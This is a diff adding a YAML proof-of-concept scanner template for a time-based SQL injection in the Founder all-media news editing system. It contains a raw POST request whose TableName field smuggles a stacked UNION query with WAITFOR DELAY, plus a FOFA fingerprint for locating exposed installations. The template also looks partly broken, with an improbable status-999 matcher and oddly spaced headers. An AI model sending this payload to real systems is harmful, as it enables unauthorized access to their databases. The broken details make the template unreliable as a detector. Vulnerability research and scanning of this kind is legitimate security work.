@@ -1,0 +1,54 @@
+id: poc-hczhmkuad2xmc4kn
+info:
+  name: 方正全媒体新闻采编系统-SQL注入-binary
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hczhmkuad2xmc4kn'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hczhmkuad2xmc4kn
+    fofa: body="/newsedit/newsedit/" || app="FOUNDER-全媒体采编系统"
+http:
+- raw:
+  - 'POST /newsedit/newsplan/task/binary.do HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+
+
+    TableName=DOM_IMAGE+where+REFID%3D-1+union+select+%271%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27%3Bselect+DOM_IMAGE+from+IMG_LARGE_PATH&FieldName=IMG_LARGE_PATH&KeyName=REFID&KeyID=1
+
+
+    # 响应代码特征
+
+    999
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 999
+    type: status
